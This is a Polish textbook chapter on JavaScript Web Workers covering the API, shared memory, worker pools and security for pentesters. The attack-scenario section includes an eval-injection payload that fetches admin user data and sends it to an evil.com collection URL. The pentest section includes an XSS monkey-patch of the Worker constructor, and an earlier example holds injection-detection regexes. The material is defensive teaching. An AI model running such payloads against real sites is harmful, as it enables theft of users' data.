# Rozdział 20: Web Workers

## 1. Czym są Web Workers

**Web Workers** to mechanizm JavaScript umożliwiający uruchamianie skryptów w **osobnych wątkach** w przeglądarce, równolegle z głównym wątkiem UI. Umożliwia to wykonywanie ciężkich obliczeniowo zadań bez blokowania interfejsu użytkownika i Event Loop.

Web Workers działają w **izolowanym kontekście** — bez dostępu do DOM, `window`, `document`, ale z dostępem do:
- `self` — globalny kontekst Worker
- `fetch()` — sieciowe requesty
- `IndexedDB` — baza danych
- `crypto` — Web Crypto API
- `postMessage()` — komunikacja z głównym wątkiem
- `importScripts()` — ładowanie dodatkowych skryptów

Typy Web Workers:
- **Dedicated Workers** — dedykowany do jednego kontekstu (strony)
- **Shared Workers** — współdzielony przez wiele kart tego samego origin (Rozdział 21)
- **Service Workers** — interceptują sieć, działają w tle (Rozdział 19)

---

## 2. Dlaczego powstał

### Problem: single-threaded JavaScript blokuje UI

JavaScript jest single-threaded. Ciężkie obliczenia (przetwarzanie obrazów, kryptografia, parsowanie dużych plików) blokują Event Loop, co powoduje:
- Zamrożenie interfejsu użytkownika
- Brak responsywności na kliknięcia/scroll
- Dropped frames (< 60 fps)

### Rozwiązanie: Web Workers (2009, HTML5)

Web Workers wprowadzono w specyfikacji HTML5 jako sposób na przeniesienie ciężkich zadań do osobnych wątków. Główny wątek pozostaje responsywny, Worker wykonuje obliczenia i zwraca wynik przez `postMessage`.

---

## 3. Jak działa

### Tworzenie i komunikacja

```
Główny wątek (window)          Dedicated Worker
        │                              │
        │ new Worker('worker.js') ──► [Worker uruchomiony]
        │                              │
        │ worker.postMessage(data) ──► self.onmessage
        │                              │
        │                   (obliczenia...)
        │                              │
        self.onmessage ◄─── self.postMessage(result)
        │
   [obsługa wyniku]
```

### API

```javascript
// Główny wątek
const worker = new Worker('worker.js');         // Tworzenie
const worker2 = new Worker(URL.createObjectURL( // Inline worker
    new Blob(['self.onmessage = e => self.postMessage(e.data * 2)'],
    { type: 'application/javascript' })
));

worker.postMessage({ task: 'compute', data: [1,2,3] }); // Wyślij
worker.onmessage = (event) => console.log(event.data);  // Odbierz
worker.onerror = (err) => console.error(err.message);   // Błędy
worker.terminate();                                     // Zatrzymaj
```

```javascript
// W worker.js (Worker context)
self.onmessage = (event) => {
    const { task, data } = event.data;
    // ... ciężkie obliczenia ...
    self.postMessage({ result: computed });
};

// Można też używać addEventListener:
self.addEventListener('message', handler);
```

### Transferable Objects

Domyślnie dane przesyłane przez `postMessage` są **kopiowane** (Structured Clone). Dla dużych danych (ArrayBuffer) możliwe jest **przekazanie własności** (transfer) bez kopiowania:

```javascript
const buffer = new ArrayBuffer(1024 * 1024); // 1 MB
// Kopiowanie — wolne dla dużych buforów:
worker.postMessage(buffer);

// Transfer — zero-copy, główny wątek traci dostęp:
worker.postMessage(buffer, [buffer]);
// Po transferze: buffer.byteLength === 0 w głównym wątku
```

### Shared Memory z Atomics

```javascript
// Współdzielona pamięć między wątkami (ES2017)
const sharedBuffer = new SharedArrayBuffer(4);
const sharedArray = new Int32Array(sharedBuffer);

worker.postMessage({ sharedBuffer });

// W Worker:
self.onmessage = ({ data }) => {
    const arr = new Int32Array(data.sharedBuffer);
    Atomics.store(arr, 0, 42); // atomicznie zapisz
    Atomics.notify(arr, 0, 1); // obudź wątek oczekujący
};

// Główny wątek może czytać (ale to blokuje — używaj ostrożnie):
Atomics.wait(sharedArray, 0, 0); // czekaj aż != 0
console.log(sharedArray[0]); // 42
```

---

## 4. Co dzieje się wewnętrznie

### Osobny proces lub wątek

W Chrome, Workers mogą działać w:
- Tym samym procesie co strona (Renderer process) — osobny wątek
- Lub w osobnym procesie — zależy od przeglądarki i systemu

Każdy Worker ma:
- Własny Event Loop
- Własny JavaScript heap (oddzielny od głównego wątku)
- Własny Microtask Queue i Macrotask Queue

### Structured Clone dla postMessage

Dane przesyłane przez `postMessage` są **serializowane** algorytmem Structured Clone (ten sam co IndexedDB). Obsługuje Date, Map, Set, ArrayBuffer, Blob — ale NIE funkcje, DOM nodes, gettery.

### Brak shared mutable state (bez SharedArrayBuffer)

Każdy Worker ma własną kopię danych — brak domyślnego shared state. To eliminuje typowe problemy z multi-threadingiem (race conditions) ale wymaga kopiowania danych.

Z `SharedArrayBuffer` shared mutable state jest możliwe, ale wymaga synchronizacji przez `Atomics`.

---

## 5. Analogiczny przykład z życia

Web Workers to podwykonawcy w firmie:

- Główny pracownik (główny wątek) ma pełny dostęp do biura (DOM)
- Ciężkie zadania (analiza danych, kryptografia) zleca podwykonawcom (Workers)
- Podwykonawcy działają w osobnych pokojach bez dostępu do biura (brak DOM)
- Komunikacja przez wewnętrzną pocztę (postMessage/onmessage)
- Każdy podwykonawca otrzymuje kopię dokumentów (Structured Clone)
- Lub może mieć dostęp do współdzielonego segregatora (SharedArrayBuffer + Atomics)

---

## 6. Przykład kodu

```javascript
// === main.js — wzorzec Worker Pool ===
class WorkerPool {
    constructor(workerScript, poolSize = navigator.hardwareConcurrency) {
        this.workers = Array.from({ length: poolSize }, () => ({
            worker: new Worker(workerScript),
            busy: false,
            queue: []
        }));
        
        this.workers.forEach(({ worker }, i) => {
            worker.onmessage = ({ data }) => {
                const slot = this.workers[i];
                slot.busy = false;
                const { resolve } = slot.queue.shift();
                resolve(data);
                if (slot.queue.length > 0) {
                    this._dispatch(slot);
                }
            };
        });
    }
    
    run(task) {
        return new Promise((resolve, reject) => {
            const available = this.workers.find(s => !s.busy);
            const slot = available ?? this.workers[0]; // round-robin fallback
            
            slot.queue.push({ resolve, reject });
            if (!slot.busy) {
                slot.busy = true;
                slot.worker.postMessage(task);
            }
        });
    }
    
    terminate() {
        this.workers.forEach(({ worker }) => worker.terminate());
    }
}

// Użycie:
const pool = new WorkerPool('/crypto-worker.js', 4);
const hash = await pool.run({ data: largeBuffer, algorithm: 'SHA-256' });
```

```javascript
// === crypto-worker.js ===
self.onmessage = async ({ data: { data, algorithm } }) => {
    const buffer = typeof data === 'string'
        ? new TextEncoder().encode(data)
        : data;
    
    const hashBuffer = await crypto.subtle.digest(algorithm, buffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    
    self.postMessage({ hash: hashHex });
};
```

---

## 7. Przykład z prawdziwej aplikacji

### Kryptografia po stronie klienta

```javascript
// Szyfrowanie pliku w Worker (bez blokowania UI)
// main.js
async function encryptFile(file) {
    const worker = new Worker('/encryption-worker.js');
    
    const arrayBuffer = await file.arrayBuffer();
    
    return new Promise((resolve, reject) => {
        worker.onmessage = ({ data }) => {
            resolve(new Blob([data.encrypted], { type: 'application/octet-stream' }));
            worker.terminate();
        };
        worker.onerror = reject;
        
        // Transfer arrayBuffer bez kopiowania
        worker.postMessage({ buffer: arrayBuffer, filename: file.name }, [arrayBuffer]);
    });
}

// encryption-worker.js
self.onmessage = async ({ data: { buffer, filename } }) => {
    const key = await crypto.subtle.generateKey(
        { name: 'AES-GCM', length: 256 },
        false, // non-extractable
        ['encrypt']
    );
    
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, buffer);
    
    // Wróć przez postMessage (transfer encrypted buffer)
    self.postMessage({ encrypted, iv: iv.buffer }, [encrypted, iv.buffer]);
};
```

### Analiza bezpieczeństwa w Worker

```javascript
// Sanityzacja i analiza dużych plików log
// logAnalysisWorker.js
self.onmessage = ({ data: { logContent } }) => {
    const suspicious = [];
    const lines = logContent.split('\n');
    
    const patterns = [
        /\b(SELECT|INSERT|UPDATE|DELETE|DROP)\b/i,  // SQL
        /<script[^>]*>/i,                           // XSS
        /\.\.(\/|\\)/,                               // Path traversal
        /\b(eval|exec|system|passthru)\s*\(/i       // Code injection
    ];
    
    lines.forEach((line, i) => {
        patterns.forEach(pattern => {
            if (pattern.test(line)) {
                suspicious.push({ line: i + 1, content: line, pattern: pattern.source });
            }
        });
    });
    
    self.postMessage({ suspicious, total: lines.length });
};
```

---

## 8. Typowe błędy programistów

### Błąd 1: Zbyt częste postMessage z dużymi obiektami

```javascript
// BŁĄD: wysyłanie dużego obiektu przez postMessage co 16ms
// Każde postMessage kopiuje cały obiekt przez Structured Clone
setInterval(() => {
    worker.postMessage(largeDataset); // kopiowanie 10MB co 16ms → katastrofa
}, 16);

// POPRAWKA 1: Transfer (zero-copy)
worker.postMessage(buffer, [buffer]); // główny wątek traci dostęp

// POPRAWKA 2: SharedArrayBuffer (wspólna pamięć)
const shared = new SharedArrayBuffer(1024 * 1024);
worker.postMessage({ shared }); // brak kopiowania, współdzielony dostęp
```

### Błąd 2: Nieobsłużone błędy w Worker

```javascript
// BŁĄD: błąd w Worker może być niezauważony
const worker = new Worker('task.js');
worker.postMessage('start');
// Jeśli task.js rzuca błąd — nie widać tego w głównym wątku!

// POPRAWKA: zawsze obsługuj onerror i onmessageerror
worker.onerror = (err) => {
    console.error('Worker error:', err.message, err.filename, err.lineno);
};
worker.onmessageerror = (err) => {
    console.error('Deserialization error:', err);
};
```

### Błąd 3: Wyciek Worker (brak terminate)

```javascript
// BŁĄD: tworzenie Workers bez ich kończenia
function processData(data) {
    const worker = new Worker('process.js');
    worker.postMessage(data);
    // Brak worker.terminate() → Worker żyje w pamięci na zawsze!
    // W pętli → memory leak + performance degradation
}

// POPRAWKA: terminate po zakończeniu
function processData(data) {
    const worker = new Worker('process.js');
    return new Promise((resolve) => {
        worker.onmessage = ({ data: result }) => {
            resolve(result);
            worker.terminate(); // ← ważne!
        };
        worker.postMessage(data);
    });
}
```

---

## 9. Znaczenie dla bezpieczeństwa

### Izolacja Worker a XSS

Worker działa w izolowanym kontekście — nie ma dostępu do DOM ani localStorage. Ale:

```javascript
// XSS w głównym wątku NIE daje bezpośredniego dostępu do Worker internals
// Ale: XSS może kontrolować co wysyłamy do Workera

// Podatna aplikacja — Worker wykonuje eval():
self.onmessage = ({ data }) => {
    eval(data); // ← NIGDY! Worker eval = Worker-context RCE
};

// XSS w głównym wątku:
worker.postMessage('self.postMessage(crypto.subtle....)'); // Worker RCE
```

### Timing Attacks i SharedArrayBuffer

**Spectre/Meltdown (2018)** — ataki spekulatywnego wykonania wymagały precyzyjnych timerów. `SharedArrayBuffer + Atomics.wait` dawał timer z rozdzielczością < 1μs, co umożliwiało ataki Spectre.

W odpowiedzi przeglądarki **wyłączyły SharedArrayBuffer** (2018) i przywróciły go tylko gdy:
- Strona ma nagłówek `Cross-Origin-Opener-Policy: same-origin`
- Strona ma nagłówek `Cross-Origin-Embedder-Policy: require-corp`

To jest mechanizm **Site Isolation** i **COOP/COEP** (rozdziały 42 i 43).

```javascript
// Sprawdź czy SharedArrayBuffer jest dostępny
if (typeof SharedArrayBuffer !== 'undefined') {
    // COOP/COEP jest ustawione — cross-origin isolation aktywne
    console.log('crossOriginIsolated:', self.crossOriginIsolated);
}
```

### importScripts() jako wektor ataków

```javascript
// W Worker można ładować skrypty zewnętrzne
importScripts('https://cdn.example.com/library.js');
// Jeśli cdn.example.com jest skompromitowany → Worker RCE

// ZABEZPIECZENIE: CSP z worker-src 'self'
// Content-Security-Policy: worker-src 'self'
// Blokuje importScripts() z innych origin
```

### Powiązane CWE

- **CWE-79** — XSS (wektor do eval w Worker)
- **CWE-770** — Resource Exhaustion (zbyt wiele Workers, brak terminate)
- **CWE-362** — Race condition (SharedArrayBuffer bez Atomics)

---

## 10. Jak identyfikować podczas pentestu

### DevTools → Sources → Threads

1. **Sources** → zakładka **Threads** (panel po lewej)
2. Widoczne są wszystkie aktywne Workers, nazwy skryptów
3. Możesz kliknąć Worker → debugować, ustawiać breakpointy
4. Console → wybierz kontekst Worker zamiast `top`

### Znajdowanie workerów w kodzie

```javascript
// Szukaj w bundle'u strony
// Grep za:
new Worker(
importScripts(
SharedArrayBuffer
Atomics.

// W Network tab: szukaj requestów do plików .js ładowanych jako Workers
// Filtruj po "worker" w DevTools Network → filter type
```

### Analiza przez Console

```javascript
// Nie można bezpośrednio zlistować Workers z JS, ale:
// Jeśli masz XSS — monkey-patch Worker constructor:
const OriginalWorker = Worker;
window.Worker = function(script, opts) {
    console.log('[Worker] Created:', script);
    const w = new OriginalWorker(script, opts);
    const origPostMessage = w.postMessage.bind(w);
    w.postMessage = function(data, ...rest) {
        console.log('[Worker] postMessage to worker:', data);
        return origPostMessage(data, ...rest);
    };
    return w;
};
```

---

## 11. Jak testować bezpieczeństwo

```
□ Czy Worker obsługuje dane z postMessage bez walidacji?
□ Czy Worker używa eval() lub Function() z danymi wejściowymi?
□ Czy importScripts() ładuje zewnętrzne (cross-origin) skrypty?
□ Czy CSP blokuje worker-src i script-src dla Workers?
□ Czy SharedArrayBuffer jest używane — czy COOP/COEP jest ustawione?
□ Czy Workers są terminowane po zakończeniu (brak memory leak)?
□ Czy Worker ma dostęp do IndexedDB z wrażliwymi danymi?
□ Czy błędy Workera są obsługiwane i nie ujawniają informacji?
□ Czy Worker wykonuje kryptograficzne operacje z non-extractable kluczami?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz 1: Worker eval() → RCE w kontekście Worker

```javascript
// Podatny Worker:
self.onmessage = ({ data }) => {
    const result = eval(data.expression); // PODATNOŚĆ
    self.postMessage(result);
};

// Atak (XSS w głównym wątku → postMessage do Worker):
worker.postMessage({
    expression: `
        fetch('/api/admin/users').then(r=>r.json()).then(d=>
            fetch('https://evil.com/steal?d=' + btoa(JSON.stringify(d)))
        )
    `
});
// Worker wykonuje fetch do /api/admin z cookies session (same-origin)
```

### Scenariusz 2: Timing attack przez Atomics

```javascript
// Atakujący stworzy SharedArrayBuffer + Worker do timing attack:
const sab = new SharedArrayBuffer(8);
const arr = new Int32Array(sab);

const worker = new Worker(URL.createObjectURL(new Blob([`
    const arr = new Int32Array(self.sharedBuffer);
    // Mierz czas dostępu do pamięci (Spectre-like)
    const t0 = Date.now();
    Atomics.load(arr, 0);
    const t1 = Date.now();
    self.postMessage(t1 - t0);
`])));
worker.postMessage({ sharedBuffer: sab }, [sab]);
// Wymaga COOP/COEP — większość stron nie ma → SharedArrayBuffer niedostępny
```

---

## 13. Jak się zabezpieczać

```javascript
// 1. Nigdy nie eval w Worker
self.onmessage = ({ data }) => {
    // Zamiast eval: whitelist dozwolonych operacji
    if (!['compute', 'hash', 'sort'].includes(data.task)) {
        self.postMessage({ error: 'Unknown task' });
        return;
    }
    // dispatch na podstawie task
};

// 2. Waliduj dane wejściowe przed postMessage
function sendToWorker(data) {
    // Waliduj typ i strukturę
    if (typeof data.input !== 'string' || data.input.length > 10000) {
        throw new Error('Invalid input');
    }
    worker.postMessage(data);
}

// 3. CSP dla Workers
// HTTP header:
// Content-Security-Policy: worker-src 'self'; script-src 'self'
// Blokuje importScripts z innych origin

// 4. Nie ładuj zewnętrznych skryptów w Worker
// Zamiast:
importScripts('https://cdn.example.com/lib.js');
// Bundluj biblioteki lokalnie:
importScripts('/local/lib.js');

// 5. COOP/COEP jeśli używasz SharedArrayBuffer
// HTTP headers:
// Cross-Origin-Opener-Policy: same-origin
// Cross-Origin-Embedder-Policy: require-corp
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. Web Workers = JavaScript w osobnym wątku, bez dostępu do DOM
2. Komunikacja tylko przez postMessage (Structured Clone lub transfer)
3. Dedicated Worker — jeden kontekst; Shared Worker — wiele kart (następny rozdział)
4. SharedArrayBuffer + Atomics = shared memory, wymaga COOP/COEP
5. Główne zagrożenia: eval w Worker, importScripts z zewnętrznych źródeł, brak terminate

**Dla pentestera:**
- Sources → Threads w DevTools do analizy Workers
- Szukaj eval(), importScripts() w kodzie Worker
- Sprawdź CSP: czy worker-src jest ograniczony do 'self'
- SharedArrayBuffer widoczny → sprawdź COOP/COEP headers

---

## Powiązania

```
Web Workers
    │
    ├──► Shared Workers (Rozdział 21)
    │         Współdzielony Worker między kartami tego samego origin
    │
    ├──► Service Workers (Rozdział 19)
    │         Specjalny Worker z fetch interception i offline capability
    │
    ├──► SharedArrayBuffer / Atomics
    │         Wspólna pamięć — wymaga COOP/COEP (Rozdziały 42, 43)
    │
    └──► postMessage (Rozdział 23)
              Mechanizm komunikacji między Workerem a stroną
```
